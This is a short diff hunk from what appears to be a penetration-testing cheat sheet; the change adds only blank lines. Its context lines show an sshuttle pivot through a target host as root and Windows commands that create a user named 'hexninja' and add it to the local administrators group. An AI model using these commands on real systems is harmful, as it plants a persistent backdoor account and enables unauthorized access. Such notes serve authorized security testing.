@@ -45,6 +45,8 @@ sshuttle -r root@TARGETIP -e "ssh -i rsa" TARGETIPRANGE.0/24
 
 
  #Adding user on windows cmd line & adding it to local admin group 
+ 
 net user hexninja lolbr3@k3r /ADD
+
 net localgroup administrators hexninja /ADD
 
